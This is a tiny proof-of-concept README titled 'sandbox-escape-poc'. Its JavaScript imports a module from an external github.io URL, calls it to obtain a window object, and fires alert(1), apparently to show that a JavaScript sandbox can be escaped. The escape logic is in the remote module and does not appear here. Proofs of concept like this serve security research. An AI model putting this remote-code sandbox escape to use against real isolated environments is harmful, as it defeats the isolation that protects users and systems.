# sandbox-escape-poc

```javascript
const modulePromise = import ("https://lgfrbcsgo.github.io/sandbox-escape-poc/module.js")

modulePromise.then(module => {
  const window = module.default()
  window.alert(1)
})
```
